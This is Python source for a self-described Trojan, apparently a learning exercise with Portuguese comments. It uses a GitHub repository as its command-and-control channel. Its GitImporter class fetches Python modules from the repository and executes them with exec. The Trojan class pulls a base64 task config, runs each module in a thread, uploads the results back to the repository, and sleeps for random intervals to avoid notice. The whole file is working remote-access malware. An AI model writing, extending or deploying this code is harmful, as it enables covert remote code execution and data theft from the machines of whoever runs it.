from github import Github
import base64
import importlib
import json
import random
import sys
import threading
import time
from datetime import datetime

# Função para conectar ao repositório do GitHub usando um token armazenado em um arquivo local
def github_connect():
    with open('secret.txt') as f:
        token = f.read().strip()
    g = Github(token)
    repo = g.get_repo("Adalberto069/ratatouille")  # Nome de usuário e repositório
    return repo

# Função para recuperar o conteúdo de um arquivo de um diretório específico no repositório do GitHub
def get_file_contents(dirname, module_name, repo):
    file = repo.get_contents(f'{dirname}/{module_name}')
    return file.decoded_content.decode()

# Classe representando o Trojan
class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_config(self):
        try:
            config_json = get_file_contents('config', self.config_file, self.repo)
            config = json.loads(base64.b64decode(config_json))
            for task in config:
                if task['module'] not in sys.modules:
                    exec(f"import {task['module']}")
            return config
        except Exception as e:
            print(f"Erro ao obter configuração: {e}")
            return []

    def module_runner(self, module):
        try:
            result = sys.modules[module].run()
            self.store_module_result(result)
        except Exception as e:
            print(f"Erro ao executar o módulo {module}: {e}")

    def store_module_result(self, data):
        try:
            message = datetime.now().isoformat()
            remote_path = f'data/{self.id}/{message}.data'
            bindata = base64.b64encode(bytes(f'{data}', 'utf-8'))
            self.repo.create_file(remote_path, message, bindata.decode())
        except Exception as e:
            print(f"Erro ao armazenar resultado: {e}")

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30*60, 3*60*60))

# Classe para importar módulos Python dinamicamente do repositório GitHub
class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_spec(self, fullname, path, target=None):
        print(f"[*] Tentando recuperar {fullname}")
        self.repo = github_connect()
        try:
            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
            if new_library is not None:
                self.current_module_code = new_library
                return importlib.util.spec_from_loader(fullname, loader=self)
        except Exception as e:
            print(f"[*] Módulo {fullname} não encontrado no repositório.")
            return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()
